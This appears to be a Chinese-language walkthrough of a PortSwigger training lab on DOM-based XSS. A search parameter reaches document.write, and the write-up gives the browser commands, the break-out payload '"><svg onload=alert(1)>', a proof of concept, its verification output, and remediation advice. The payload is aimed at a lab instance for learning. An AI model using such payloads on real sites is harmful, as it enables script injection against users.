---
title: "158 · DOM XSS document.write 汇聚点(DOM XSS in document.write sink using source location.search)"
links:
  - target: dom-xss-family
    relation: evidences
---

# 158 · DOM XSS document.write 汇聚点(DOM XSS in document.write sink using source location.search)

> evidences: [[dom-xss-family]]

| 项 | 值 |
|---|---|
| 类目 | DOM-based vulnerability |
| 难度 | APPRENTICE |
| 实例 | 0a5000c203240f5d808d124500db0053.web-security-academy.net |
| 凭据 | 无需登录 |
| 交卷值 | 经 search 查询参数在 document.write 语境破引号注入 svg onload,执行 alert(1) |

## 题面分析

站点首页的搜索查询跟踪函数把 location.search 的取值未经编码拼进一个 img 标签,再交给 document.write 写入页面。document.write 属 HTML 注入级汇聚点,输入落入标签属性语境,攻击者以引号与尖括号闭合属性与标签即可注入任意元素。

攻击者动作链是把破引号载荷放进 search 参数构成完整 URL,诱导受害者访问该 URL;页内脚本随即以 document.write 写出被注入的 svg 元素,其 onload 事件处理器执行 alert(1),判定动作即为脚本在实例域实际执行。

## 解题过程

1. 题页载入与题面描述段读取如下。

   ```console
   $ browse rune @rn/psw-goto --root ~/.local/share/pentest_rs/workspace/logic-exploitation/snippets --vars url=https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
   $ browse rune @rn/page-text --root ~/.local/share/pentest_rs/workspace/logic-exploitation/snippets --vars n=560
   描述段节选:This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL. To solve this lab, perform a cross-site scripting attack that calls the alert function.
   ```

   - 题面披露判定目标为 alert 面,机制面点明 source 为 location.search 与 sink 为 document.write;本题面向未登录访客,无凭据段。

2. 起实例:在题页读取 ACCESS THE LAB 按钮的真实链接并访问,回执落到实例域。

   ```console
   $ browse 'goto("https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink")' >/dev/null 2>&1
   $ browse --js 'return (()=>{const els=[...document.querySelectorAll("a,button,input,form")].filter(e=>/access the lab/i.test((e.innerText||e.value||""))); return JSON.stringify(els.map(e=>({tag:e.tagName, href:e.href||null})));})()'
   [{"tag":"A","href":"https://portswigger.net/academy/labs/launch/6127df9244c9acedc241085d647719a0d9975c5af692444a9c913566fd2fd88b?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-document-write-sink"}]
   $ browse 'goto("https://portswigger.net/academy/labs/launch/6127df9244c9acedc241085d647719a0d9975c5af692444a9c913566fd2fd88b?referrer=%2fweb-security%2fcross-site-scripting%2fdom-based%2flab-document-write-sink")' >/dev/null 2>&1
   $ browse --js 'return JSON.stringify({url:location.href,title:document.title})'
   {"url":"https://0a5000c203240f5d808d124500db0053.web-security-academy.net/","title":"DOM XSS in document.write sink using source location.search"}
   ```

   - 题页按钮的 href 是学院的中转链接,访问后重定向到实例域 0a5000c203240f5d808d124500db0053.web-security-academy.net。

3. 实例根页结构探索:取表单、脚本与链接面。

   ```console
   $ browse --js 'return JSON.stringify({forms:[...document.querySelectorAll("form")].map(f=>({action:f.action,method:f.method,inputs:[...f.querySelectorAll("input")].map(i=>i.name)})), scripts:[...document.querySelectorAll("script")].map(s=>({src:s.getAttribute("src")||null,text:s.textContent}))})'
   {"forms":[{"action":"https://0a5000c203240f5d808d124500db0053.web-security-academy.net/","method":"get","inputs":["search"]}],"scripts":[{"src":"/resources/labheader/js/labHeader.js","text":""}]}
   ```

   - 站点是博客形首页,唯一的可写输入面是 GET 搜索表单参数 search;document.write 逻辑属页内联脚本,页内脚本清单未直接列出该函数,须以响应实况定位。

4. 基线请求与判型:以良性值跑一次搜索,观察汇聚点输出。

   ```console
   $ browse 'goto("https://0a5000c203240f5d808d124500db0053.web-security-academy.net/?search=testmarker")' >/dev/null 2>&1
   $ browse --js 'return JSON.stringify({imgs:[...document.querySelectorAll("img")].map(i=>i.getAttribute("src"))})'
   {"imgs":["/resources/images/tracker.gif?searchTerms=testmarker"]}
   ```

   - 基线确认:search 取值原样拼进 document.write 写出的 `img src="/resources/images/tracker.gif?searchTerms=<取值>"`,输入落在 src 属性语境且无编码断点,判型为 XSS 上下文逃逸,子型属 HTML 注入汇聚点。

5. 最小验证:一次只改 search 一个变量,以破引号载荷闭合属性与标签并注入 svg onload。

   ```console
   $ browse 'goto("https://0a5000c203240f5d808d124500db0053.web-security-academy.net/?search=%22%3E%3Csvg%20onload%3Dalert(1)%3E")' >/dev/null 2>&1
   $ browse --js 'return (()=>{const congr=[...document.querySelectorAll("div,section")].filter(e=>/Congratulations/.test(e.innerText||"")).pop(); const img=[...document.querySelectorAll("img")].find(i=>/searchTerms/.test(i.getAttribute("src")||"")); return JSON.stringify({bannerText:congr?congr.innerText.trim().slice(0,60):null, trackerImg:img?img.outerHTML:null, onloadSvg:[...document.querySelectorAll("svg[onload]")].map(s=>s.outerHTML.slice(0,60))});})()'
   {"bannerText":"Congratulations, you solved the lab!","trackerImg":"<img src=\"/resources/images/tracker.gif?searchTerms=\">","onloadSvg":["<svg onload=\"alert(1)\">"]}
   ```

   - 载荷 `"><svg onload=alert(1)>` 使 document.write 写出的 img 标签在 searchTerms 处被 `">` 闭合,随后注入的 svg 元素带 onload 处理器;trackerImg 原文止于 `searchTerms=` 即闭合生效的逐字证据,onloadSvg 原文即注入元素在场证据,横幅随即宣读致谢。

   - 关键节点一解读:基线 img 原文 `searchTerms=testmarker` 与注入后 img 原文 `searchTerms=` 两相对照,同一参数单变量变更,证明逃逸成立且注入元素落在文档主语境。

## 漏洞成因分析

1. 页内脚本把 location.search 取值未经编码拼进 HTML 字符串,再交给 document.write,数据与标记边界失效。

2. 输入直接落进标签属性语境,没有属性值编码与标签转义两道防线。

3. 汇聚点为 document.write 这一 HTML 注入级出口,天然允许注入新元素与新事件处理器。

## 漏洞利用复盘

工具:
- browse
- rn 片段件 alert-check、check-solved、psw-goto、page-text

### 复现步骤

1. browse 载入题页,page-text 读取判定目标;提取并访问 ACCESS THE LAB 中转链接落到实例域。

2. browse 探表单与脚本面,以 search=testmarker 跑基线,定位 document.write 汇聚点。

3. 以 search 单参数换成破引号载荷构造 URL,注入 svg onload 即触发判定。

4. browse 跑 rn 片段件 alert-check 与 check-solved 作权威判读。

### PoC

```console
$ browse 'goto("https://0a5000c203240f5d808d124500db0053.web-security-academy.net/?search=%22%3E%3Csvg%20onload%3Dalert(1)%3E")'
$ R=~/.local/share/pentest_rs/workspace/logic-exploitation/snippets; browse rune @rn/alert-check --root $R --vars url='https://0a5000c203240f5d808d124500db0053.web-security-academy.net/?search=%22%3E%3Csvg%20onload%3Dalert(1)%3E' --vars hover=0 --vars hsel=x
alert 命中(勾子旗标道:脚本真执行);事件道:命中;旗标实参:"1";;弹窗无需收;落地:"https://0a5000c203240f5d808d124500db0053.web-security-academy.net/?search=%22%3E%3Csvg%20onload%3Dalert(1)%3E"
```

### 验收

```console
$ browse rune @rn/check-solved --root $R
{"congrats":true,"notSolved":false}
```

- check-solved 在实例域 fetch 首页 header,congrats 为真且 notSolved 为假,横幅「Congratulations, you solved the lab!」为实,判定成立。

## 关键解题节点总结

关键节点一:

- 通道实录:基线 search=testmarker 的 img 原文为 `/resources/images/tracker.gif?searchTerms=testmarker`,输入落 src 属性语境且无编码。

- 表单实录:首页唯一输入面是 GET 表单参数 search。

- 注入实录:载荷 `"><svg onload=alert(1)>` 后 img 原文止于 `searchTerms=`,onloadSvg 原文为 `<svg onload="alert(1)">`。

关键节点二:

- 对照实验三条:自身态为基线 img 携 testmarker;越权态不可用(无凭据面);判定成立态为破引号载荷注入 svg onload 并在文档主语境在场。

- 单变量纪律:两次请求只改 search 一个参数,其余与基线一致。

关键节点三:

- 本题为交卷动作即解型。

- 判定触发点是破引号载荷注入的 svg onload 在实例域执行 alert(1)。

- 实例横幅随即宣读致谢(congrats 为真)。

## 陷阱与注意事项

- 页内脚本清单取不到 document.write 逻辑:汇聚点须以响应实况(实际写出的 img 元素)定位,不以脚本静态清单下结论。

- 破引号形须同时闭合属性与标签:`">` 闭合 src 属性并结束 img 标签,缺一即载荷仍留在属性值内不生效。

- 判定面须驻实例域:题页域的服务端原文不带状态文案,横幅在题页域跑会得误态,权威读值在实例域进行。

- URL 载荷须做百分号编码,直接内联引号与尖括号会被浏览器与 CDP 请求层改写。

## 漏洞修复建议

1. 搜索取值不入任何求值或标记语境,需要回显时按上下文做输出编码(属性语境做属性值编码)。

2. 以 document.createElement 与 setAttribute 构元素替代 document.write 拼字符串,消除标记边界失效面。

3. 收紧 CSP 脚本执行面,并覆盖内联事件处理器面,作为纵深防御。

## 漏洞利用件改进

- rs 面自省:本题为单请求破引号注入,存量 psw_reqseq 与 http_fuzz 覆盖参数变参面,本役无新件需求。

- rn 面自省:browse 面走 psw-goto 读题页、page-text 读题面、alert-check 勾子旗标道验证脚本执行、check-solved 读横幅四件;侦察与基线定位走方言片段直出。

相关工具件:
- `~/.local/share/pentest_rs/workspace/logic-exploitation/snippets/rn/alert-check.rn`
- `~/.local/share/pentest_rs/workspace/logic-exploitation/snippets/rn/check-solved.rn`
- `~/.local/share/pentest_rs/workspace/logic-exploitation/snippets/rn/psw-goto.rn`
- `~/.local/share/pentest_rs/workspace/logic-exploitation/snippets/rn/page-text.rn`

## 知识面聚合

经验聚合 `operations/business-logic-vulnerability/tools-cookbook/dom-xss-sink-map.md`

知识聚合 `knowledge/business-logic-vulnerability/vuln-families/injection-family.md`

- 经验聚合细节:sink 地图 document.write 条目(HTML 注入级)由本役补首录实证,source 地图 location.search 条目(回传型最高发)与本役一致。

- 知识聚合细节:injection 族页 XSS 上下文逃逸行收录 40、41、44、128 至 130,本役为该行补 document.write 汇聚点破引号注入这一列的首录实证。
